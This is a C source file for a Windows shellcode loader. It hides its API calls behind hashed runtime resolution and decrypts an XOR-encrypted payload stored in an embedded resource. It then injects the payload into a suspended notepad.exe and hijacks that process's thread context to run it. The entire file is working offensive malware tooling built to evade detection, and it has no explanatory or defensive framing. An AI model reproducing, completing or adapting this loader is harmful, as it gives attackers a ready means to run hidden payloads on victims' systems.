#include "App.h"
#include "runtimeResolveFunc.h"
#include "hashConst.h"
#include "hashing.h"
#include "getModHandle.h"
#include "ApiProto.h"

int main()
{
	HRSRC	hRsrc = NULL;
	HGLOBAL	hGlobal = NULL;
	PVOID	pPayloadAddress = NULL;
	SIZE_T	sPayloadSize = NULL;

	//resolve func
	fnFindResourceW pFindResourceW = (fnFindResourceW)meow(meow2(Kernel32Dll_Hash), FindResW_Hash);
	fnLoadResource pLoadResource = (fnLoadResource)meow(meow2(Kernel32Dll_Hash), LoadRes_Hash);
	fnLockResource pLockResource = (fnLockResource)meow(meow2(Kernel32Dll_Hash), LockRes_Hash);
	fnSizeofResource pSizeofResource = (fnSizeofResource)meow(meow2(Kernel32Dll_Hash), SizeOfRes_Hash);
	fnRtlAllocateHeap pRtlAllocateHeap = (fnRtlAllocateHeap)meow(meow2(Ntdll_Hash), RtlAllocHeap_Hash);
	fnGetProcessHeap pGetProcessHeap = (fnGetProcessHeap)meow(meow2(Kernel32Dll_Hash), GetProcHeap_Hash);
	fnGetLastError pGetLastError = (fnGetLastError)meow(meow2(Kernel32Dll_Hash), GetLastError_Hash);
	fnGetEnvironmentVariableA pGetEnvironmentVariableA = (fnGetEnvironmentVariableA)meow(meow2(Kernel32Dll_Hash), GetEnvVar_Hash);
	fnCreateProcessA pCreateProcessA = (fnCreateProcessA)meow(meow2(Kernel32Dll_Hash), CreateProcA_Hash);
	fnVirtualAllocEx pVirtualAllocEx = (fnVirtualAllocEx)meow(meow2(Kernel32Dll_Hash), VirtAllocEx_Hash);
	fnWriteProcessMemory pWriteProcessMemory = (fnWriteProcessMemory)meow(meow2(Kernel32Dll_Hash), WriteProcMem_Hash);
	fnVirtualProtectEx pVirtualProtectEx = (fnVirtualProtectEx)meow(meow2(Kernel32Dll_Hash), VirtProcEx_Hash);
	fnGetThreadContext pGetThreadContext = (fnGetThreadContext)meow(meow2(Kernel32Dll_Hash), GetThreadCont_Hash);
	fnSetThreadContext pSetThreadContext = (fnSetThreadContext)meow(meow2(Kernel32Dll_Hash), SetThreadCont_Hash);
	fnResumeThread pResumeThread = (fnResumeThread)meow(meow2(Kernel32Dll_Hash), ResThread_Hash);
	fnWaitForSingleObject pWaitForSingleObject = (fnWaitForSingleObject)meow(meow2(Kernel32Dll_Hash), WaitForSingObj_Hash);


	hRsrc = pFindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);
	if (hRsrc == NULL) {
		err("FindResourceW Failed With Error : % d \n", pGetLastError());
		return EXIT_FAILURE;
	}

	okay("Find resource");

	hGlobal = pLoadResource(NULL, hRsrc);
	if (hGlobal == NULL) {
		err("LoadResource Failed With Error : %d \n", pGetLastError());
		return EXIT_FAILURE;
	}
	okay("Load resource");

	pPayloadAddress = pLockResource(hGlobal);
	if (pPayloadAddress == NULL) {
		err("LockResource Failed With Error : %d \n", pGetLastError());
		return EXIT_FAILURE;
	}

	okay("Find address of our resource: 0x%p", pPayloadAddress);

	sPayloadSize = pSizeofResource(NULL, hRsrc);
	if (sPayloadSize == NULL) {
		err("SizeofResource Failed With Error : %d \n", pGetLastError());
		return EXIT_FAILURE;
	}

	okay("Size of our resource: %d", sPayloadSize);

	PVOID pTmpBuffer = pRtlAllocateHeap(pGetProcessHeap(), HEAP_ZERO_MEMORY, sPayloadSize);
	if (pTmpBuffer != NULL) {
		RtlMoveMemory(pTmpBuffer, pPayloadAddress, sPayloadSize);
	}

	okay("copy mem: 0x%p", pTmpBuffer);

	int shellcSize = 0;
	int keySize = 0;

	RtlMoveMemory(&shellcSize, pTmpBuffer, 4);
	okay("size of shellc %d", shellcSize);

	pTmpBuffer = (void*)((char*)pTmpBuffer + 4);
	unsigned char *shellc = pRtlAllocateHeap(pGetProcessHeap(), HEAP_ZERO_MEMORY, shellcSize);
	if (shellc != NULL) {
		RtlMoveMemory(shellc, pTmpBuffer, shellcSize);
	}

	printf("[+] got xored shellc: ");

	for (int i = 0; i < shellcSize; i++)
		printf("%x", shellc[i]);

	printf("\n");

	pTmpBuffer = (void*)((char*)pTmpBuffer + shellcSize);

	RtlMoveMemory(&keySize, pTmpBuffer, 4);
	okay("size of shellc %d", keySize);

	pTmpBuffer = (void*)((char*)pTmpBuffer + 4);

	unsigned char* key = pRtlAllocateHeap(pGetProcessHeap(), HEAP_ZERO_MEMORY, keySize);
	if (shellc != NULL) {
		RtlMoveMemory(key, pTmpBuffer, keySize);
	}
	
	printf("[+] got xor key : ");
	for (int i = 0; i < keySize; i++)
		printf("%x", key[i]);

	printf("\n");

	XorByInputKey(shellc, shellcSize, key, keySize);

	printf("[+] got dexored shellcode: ");

	for (int i = 0; i < shellcSize; i++)
		printf("%x", shellc[i]);

	printf("\n\n");

	info("stage 2: shell injection");

	DWORD pid;
	HANDLE hProcess, hThread = NULL;
	LPVOID shellcAdress = NULL;

	CHAR lpPath[MAX_PATH * 2];
	CHAR WnDr[MAX_PATH];

	STARTUPINFO	Si = { 0 };
	PROCESS_INFORMATION	Pi = { 0 };

	Si.cb = sizeof(STARTUPINFO);

	if (!pGetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
		err("GetEnvironmentVariableA Failed With Error : %d \n", pGetLastError());
		return EXIT_FAILURE;
	}

	sprintf(lpPath, "%s\\System32\\%s", WnDr, "notepad.exe");
	okay("Running in suspended mode: \"%s\" ... ", lpPath);

	if (!pCreateProcessA(
		NULL,					
		lpPath,					
		NULL,					
		NULL,					
		FALSE,					
		CREATE_SUSPENDED,		
		NULL,					
		NULL,					
		&Si,					
		&Pi)) {					

		okay("CreateProcessA Failed with Error : %d \n", pGetLastError());
		return EXIT_FAILURE;
	}

	pid = Pi.dwProcessId;
	hProcess = Pi.hProcess;
	hThread = Pi.hThread;

	
	SIZE_T  sNumberOfBytesWritten = NULL;
	DWORD   dwOldProtection = NULL;

	shellcAdress = pVirtualAllocEx(hProcess, NULL, shellcSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (shellcAdress == NULL) {
		err("\tVirtualAllocEx Failed With Error : % d \n", pGetLastError());
		return EXIT_FAILURE;
	}

	okay("Allocated Memory At : 0x%p \n", shellcAdress);

	if (!pWriteProcessMemory(hProcess, shellcAdress, shellc, shellcSize, &sNumberOfBytesWritten) || sNumberOfBytesWritten != shellcSize) {
		err("\tWriteProcessMemory Failed With Error : %d \n", pGetLastError());
		return EXIT_FAILURE;
	}

	if (!pVirtualProtectEx(hProcess, shellcAdress, shellcSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		err("\t[!] VirtualProtectEx Failed With Error : %d \n", pGetLastError());
		return EXIT_FAILURE;
	}

	CONTEXT	ThreadCtx = {
		.ContextFlags = CONTEXT_CONTROL
	};

	if (!pGetThreadContext(hThread, &ThreadCtx)) {
		err("\tGetThreadContext Failed With Error : %d \n", GetLastError());
		return EXIT_FAILURE;
	}

	ThreadCtx.Eip = shellcAdress;

	if (!pSetThreadContext(hThread, &ThreadCtx)) {
		err("\tSetThreadContext Failed With Error : %d \n", GetLastError());
		return EXIT_FAILURE;
	}

	pResumeThread(hThread);

	pWaitForSingleObject(hThread, INFINITE);

	return EXIT_SUCCESS;
}